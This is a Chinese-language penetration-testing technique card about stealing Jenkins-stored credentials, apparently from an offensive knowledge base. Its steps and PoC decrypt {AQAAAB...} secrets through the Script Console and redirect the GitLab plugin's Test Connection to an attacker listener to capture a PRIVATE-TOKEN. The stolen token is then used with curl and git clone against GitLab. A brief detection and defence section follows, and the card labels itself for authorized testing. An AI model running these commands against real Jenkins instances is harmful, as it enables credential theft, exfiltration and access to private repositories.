---
id: web-java-component-jenkins-hudson-secret-plaintext-test-connection-token-leak
title: Jenkins 加密凭据值取明文：Script Console 里 hudson.util.Secret.fromString().getPlainText()，或把 GitLab 连接 URL 指向监听端用 Test Connection 钓出 PRIVATE-TOKEN
type: scenario
domain: web
path: web/java/component
technique: jenkins-hudson-secret-plaintext-test-connection-token-leak
aliases:
- hudson.util.Secret 解密
- Jenkins 凭据 {AQAAAB} 解密
- GitLab Test Connection token 泄露
- Jenkins GitLab API Token 窃取
- Secret.fromString getPlainText
tags:
- jenkins
- hudson
- credentials
- groovy
- gitlab
- token-leak
- script-console
- ssrf
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V588
  verified_at: '2026-11-12T14:10:07+08:00'
  notes: 已对照原文与全部50张截图核对：凭据页 HTML 中 _.apiToken 的 value 为 {AQAAAB...} 密文（图19），Script Console 执行 hudson.util.Secret.fromString(...).getPlainText() 输出 glpat-7kD_qLH2PiQv_ywB9hz2（图21），密文与 token 已逐字符比对一致；Test Connection 方式将 GitLab host URL 改为监听端后收到 PRIVATE-TOKEN 头（图20）。Jenkins 2.375.1 仅为靶场环境版本而非受影响区间，不设 affected_versions。未验证点：Test Connection 的凭据外带行为依赖插件版本，原文未标注。
---

## 一句话结论

Jenkins 凭据页面/HTML 中形如 `{AQAAAB...}` 的值是 `hudson.util.Secret` 密文；拿到 Jenkins 管理员后不必读 `master.key` 离线解密——在 Script Console 执行 `println(hudson.util.Secret.fromString("{AQAAAB...}").getPlainText())` 就能直接得到明文（本例为 GitLab Personal Access Token）；另一种更黑盒的方式是把依赖该凭据的 GitLab 连接 host URL 改成攻击者监听地址并点 “Test Connection”，插件会带着该 token 发起请求，监听端直接抓到 `PRIVATE-TOKEN` 头。

## 原理

- **hudson.util.Secret 的加密与解密**：Jenkins 用实例级密钥把凭据字段加密成 `{AQAAAB...}` 形式；运行时该密钥已加载在 Jenkins JVM 内，`hudson.util.Secret.fromString(密文).getPlainText()` 会直接用 JVM 内的密钥解密，因此只要能执行 Groovy（Script Console），不需要访问 `secrets/master.key`/`hudson.util.Secret` 文件即可还原单个值。
- **凭据值在页面中的暴露**：编辑凭据页面把加密值放在 `<input name="_.apiToken" type="password" value="{AQAAAB...}">` 中，虽然页面显示为掩码，HTML 源码/响应里是完整密文；拿到管理员会话即可读取。
- **Test Connection 的凭据外带**：Jenkins GitLab 插件在 “Test Connection” 时会用配置的 API token 向 `GitLab host URL` 发送认证请求（`PRIVATE-TOKEN` 头）。host URL 是管理员可编辑的普通字段，把它改成攻击者控制的 HTTP 服务后，点击测试就把 token 发给了攻击者——等同于通过插件的服务端请求功能窃取存储凭据。
- **为什么有效**：两种方法都绕过了“密文无法离线解密”的表象：前者利用 JVM 内已解密的密钥，后者利用 Jenkins 自身作为客户端主动使用凭据；都不需要破解 Jenkins 的加密格式。
- **边界**：需要 Jenkins 管理员或 Script Console 权限，或至少能修改全局 GitLab 连接配置；Script Console 被禁用/沙箱限制时，Test Connection 方式仍可能可用（取决于插件版本与配置权限）。

## 触发条件

- 已获得 Jenkins 管理员权限（或 Script Console 执行权限/可修改系统配置的账号）。
- 目标凭据以 `{AQAAAB...}` 形式存在于页面、`credentials.xml` 或插件配置中；本例为 GitLab API token。
- 目标 Jenkins 可出站访问攻击者的 HTTP 监听地址（Test Connection 方式），或 Script Console 未被禁用（Groovy 方式）。
- 仅限授权测试环境。

## 利用步骤

1. 在 Jenkins 凭据/系统配置页面打开浏览器开发者工具，从 HTML 中找到 `_.apiToken` 等字段的 `value="{AQAAAB...}"`，复制密文。
2. 方式一：进入 `Manage Jenkins → Script Console`，执行
   `println(hudson.util.Secret.fromString("{AQAAAB...}").getPlainText())`，结果即明文 token。
3. 方式二：在 `Manage Jenkins → System → GitLab` 把 `GitLab host URL` 改为 `http://<attacker>:<port>`，保存后点 `Test Connection`；在攻击者监听端（如 `nc -lvnp 8000`）观察请求，抓取 `PRIVATE-TOKEN: glpat-...` 头。
4. 用得到的 token 访问 GitLab API：`curl --header "PRIVATE-TOKEN: glpat-..." http://<gitlab>/api/v4/projects/`，克隆私有仓库、继续找凭据。
5. 清理：恢复 GitLab host URL，避免影响业务。

## PoC

```groovy
// Jenkins Script Console（方式一）
println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())
// 输出示例：glpat-7kD_qLH2PiQv_ywB9hz2
```

```bash
# 方式二：监听端
nc -lvnp 8000
# Jenkins 里把 GitLab host URL 改为 http://<attacker>:8000 并点 Test Connection
# 监听端收到：
# PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2
```

```bash
# 使用窃得的 token
curl --silent --header "PRIVATE-TOKEN: glpat-..." "http://<gitlab>/api/v4/projects/" | jq
git clone http://gitlab.local:glpat-...@<gitlab>/group/repo.git
```

## 变体与关联

- **离线解密**：`web-java-component-jenkins-script-console-master-key-credential-decrypt` 用 `master.key + secrets/hudson.util.Secret + credentials.xml` 批量解密；本卡是在 JVM 内直接解密单个值，或在插件请求中钓取明文，适用于只拿到页面密文/单个凭据的场合。
- **同类插件外带**：SMTP、LDAP、Slack、GitHub 等 “Test Connection/发送测试消息” 功能同样会用已存凭据发起请求；把目标地址改成攻击者服务即可钓取口令/token（本质是 Jenkins 服务端 SSRF + 凭据外带）。
- **后续横向**：`pentest-lateral-movement-gitlab-password-grant-token-project-credential-harvest` 覆盖 GitLab token 枚举项目、克隆私有仓库并提取数据库配置；`pentest-recon-github-repo-history-secret-mining` 覆盖仓库历史敏感信息挖掘。
- **替代入口**：`web-java-component-jenkins-cli-at-file-arbitrary-read-cve-2024-23897` 在无管理员时也可读取 Jenkins 文件；若能读到 `credentials.xml` 与密钥文件，则按离线解密卡处理。

## 检测与防御

- 检测：Jenkins 审计日志中出现 Script Console 执行 `hudson.util.Secret.fromString` 的脚本；系统配置中 GitLab host URL 被改为外部地址并触发 Test Connection；Jenkins 出站到陌生 IP 的 HTTP 请求。
- 防御：禁用/限制 Script Console 与系统配置权限（最小权限、项目级角色）；对凭据字段做掩码返回（避免密文出现在 HTML）；出站流量白名单；定期轮换 Jenkins 中保存的 API token；使用外部凭据提供者（Vault 等）避免密文落库。
